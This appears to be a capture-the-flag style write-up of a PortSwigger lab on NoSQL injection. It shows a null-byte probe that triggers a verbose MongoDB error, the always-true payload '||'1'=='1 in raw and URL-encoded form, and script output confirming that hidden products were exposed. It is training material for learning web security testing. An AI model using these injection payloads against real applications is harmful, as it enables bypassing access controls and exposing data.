# Lab: Detecting NoSQL injection

### Instructions

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products. 

### Solution

Looking at the application we find a categories parameter:

```
https://0a3400e20464a08d80940df300f40019.web-security-academy.net/filter?category=Accessories
```

This parameter searches the category type, and based on the instructions, includes something like:

```
this.category == 'fizzy' && this.released == 1
```

Ensuring that the product displayed is released.

We can attempt to bypass this check by adding a null-byte to our query, which terminates the search so the released part of the query is not run.

Trying something like:

```
https://0a3400e20464a08d80940df300f40019.web-security-academy.net/filter?category=Accessories%00
```

This gives us a verbose Mongo error:

```
Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: unterminated string literal : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
```

We can next try to inject a condition that will always evaluate to true:

```
'||'1'=='1
```

And because this condition is always true, the query returns all items:

```
https://0a3400e20464a08d80940df300f40019.web-security-academy.net/filter?category=Accessories%27%7c%7c%27%31%27%3d%3d%27%31
```

Returning both released and unreleased items solves the lab.


### Python Solution

See `nosqli_01.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/NoSQL_Injection/NoSQLi_01_detecting_nosql_injection]
└─$ python nosqli_01.py https://0a66006504ff99038059531b00e30031.web-security-academy.net/
[+] Normal released items: 3
[+] Released and unreleased items: 16
[+] NoSQLi successful, all items returned
```